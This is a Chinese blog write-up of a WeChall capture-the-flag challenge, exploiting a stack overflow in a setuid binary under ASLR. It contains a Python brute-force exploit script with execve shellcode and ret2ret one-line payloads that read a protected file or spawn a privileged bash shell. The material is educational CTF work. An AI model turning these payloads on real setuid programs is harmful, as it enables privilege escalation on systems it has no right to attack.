---
title: 'Writeup-Training: Warchall &#8211; 7 Tropical Fruits'
layout: post
categories: blog
tags: [Hack, Python, Writeup]
comments: true
share: true
---
<p style="color: #000000;">
  Challenge URL：<a style="color: #294666;" href="http://www.wechall.net/challenge/warchall/tropical/7/index.php">Training: Warchall &#8211; 7 Tropical Fruits</a>
</p>

Wechall的tropic这道题真是撸得我考试周复(yu)习(xi)都没心思了，花了两天半终于搞定了，才63人做出来的题目居然是training！！！

做这题的时候也是我第一次写shellcode，不过这道题难点不在于shellcode怎么写，而在于坑爹的ASLR。不说stack的地址一直在变，居然连linux-gate.so都在变！

一开始查了好久，发现个思路叫ret2libc，然后我gdb了一下，发现system()的地址虽然是随机的，但是有6位是不变的。然后我就撸啊撸，撸了个shell脚本，速度不错，居然半分钟之内就能把system(&#8220;sh&#8221;)跑出来。看到&#8221;sh-4.2$&#8221;的时候我那叫一个激动啊。坑爹的是system()这货执行的时候居然会丢掉suid的权限(man system#NOTES)。

所以忙活了一天，我的成果就是，在一个shell下面，再开一个shell&#8230;&#8230;

然后第二天我不甘心啊，就找啊找找啊找，找到了exec函数族。

{% highlight c %}
#include <unistd.h>
extern char **environ;
int execl(const char *path, const char *arg, ...);
int execlp(const char *file, const char *arg, ...);
int execle(const char *path, const char *arg, ..., char * const envp[]);
int execv(const char *path, char *const argv[]);
int execvp(const char *file, char *const argv[]);
int execve(const char *path, char *const argv[], char *const envp[]);
//其中只有execve是真正意义上的系统调用，其它都是在此基础上经过包装的库函数。
{% endhighlight %}

这货厉害，suid会传递下去，但是悲催的是每个函数的参数不止一个，而且大多都要求最后一个参数为NULL(直接无视)，但是execv之类的函数又不方便构造后面的那些二阶指针，所以我昨天就是在满屏的Segmentation Fault中度过的，偶尔出现的Invalid Instruction能让人高兴好一阵。

第二天无果，不过我cat了一下compile7.sh，发现了好玩的东西

{% highlight sh %}
#!/bin/bash
gcc -fno-stack-protector -z execstack level7.c -o level7
chmod 6755 level7
{% endhighlight %}

是的&#8230;出题者把DEP关掉了&#8230;然后我就睡不着了

## 解法：

今天早上考完离散就立马赶回寝室继续撸这道题，虽然解法很很蠢(对stack的5个随机位进行碰撞)，但是至少能在10分钟内出结果……

先给solution.txt建一个到工作目录软连接:

{% highlight sh %}
$ ln -s /home/level/tropic/7/solution.txt ./lk
{% endhighlight %}


然后跑这个python脚本：

{% highlight python %}
# -*- coding=utf8 -*-
__author__ = 'Cubarco'


def tropic_crack():
    try:
        shellcode = "1\xc0\x99Rh/cath/bin\x89\xe3Rh./lk" \
                    "\x89\xe1\xb0\x0bRQS\x89\xe1\xcd\x80"
        stack_hex = hex(random.randint(0xbf00000, 0xbffffff)*0x10+0x01)[:-1]
        stack_int = int(stack_hex, 16)
        path = "/home/level/tropic/7/level7"
        args = [path,
                '\x90'*(312-len(shellcode))
                + shellcode
                + struct.pack('&lt;L', stack_int)]
        args[1] = args[1].replace("(", "\\(")\
                         .replace("\"", "\\\"")\
                         .replace(")", "\\)")\
                         .replace("\\", "\\\\")\
                         .replace("\'", "\\\'")
        p = subprocess.Popen(args,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE,
                             shell=False)
        rsp = p.stdout.read()
        if rsp != '':
            print rsp
    except:
        # print traceback.format_exc()
        # 好像subprocess开太快了会出问题...
        pass


if __name__ == '__main__':
    import struct
    import random
    import subprocess
    import traceback
    
    while True:
        tropic_crack()
{% endhighlight %}

做完题去题解讨论区看到个ret2ret的思路感觉好棒，有时间研究一下。

对了，跑脚本的时候如果它卡住了而且ctrl+c关不掉请不要来打我。正确姿势是killall&#8230;..

UPDATE: 刚看了一下ret2ret，我想去死一死了。是的，只用下面一句话就能搞定，oh，前提还是给solution.txt建立一个到工作目录的软链接，名字是lk（其实是因为./lk刚好是四字节， 如果用原来的路径好麻烦还要四字节对齐，偷个懒）

{% highlight sh%}
$ /home/level/tropic/7/level7 `python -c "print '\x90'*(312-33)+'1\xc0\x99Rh/cath/bin\x89\xe3Rh./lk\x89\xe1\xb0\x0bRQS\x89\xe1\xcd\x80'+'\xd2\x84\x04\x08'"`
# 0x080484d2是程序里面一个执行ret指令的地址，随便挑！
{% endhighlight %}

更BT一点还可以这样，跑一个/bin/bash -p：

{% highlight sh%}
$ /home/level/tropic/7/level7 `python -c "print '\x90'*(312-33)+'j\x0bX\x99Rfh-p\x89\xe1Rjhh/bash/bin\x89\xe3RQS\x89\xe1\xcd\x80'+'\xd2\x84\x04\x08'"`
bash-4.2$ id
uid=4057(cubarco) gid=4057(cubarco) egid=1008(level7) groups=4057(cubarco)
# 然后你就有level7的egid了...
{% endhighlight %}

##  参考：

  1. Hackers Hut#[Smashing The Stack][1](ASLR bypassing overview)
  2. [Performing a ret2libc Attack][2](ret2libc)
  3. [Return-to-libc Attack Lab][3](ret2libc)
  4. [Smack the Stack][4](ret2ret)

 [1]: http://www.win.tue.nl/~aeb/linux/hh/hh-10.html
 [2]: http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf
 [3]: http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Return_to_libc/Return_to_libc.pdf
 [4]: http://web.textfiles.com/hacking/smackthestack.txt
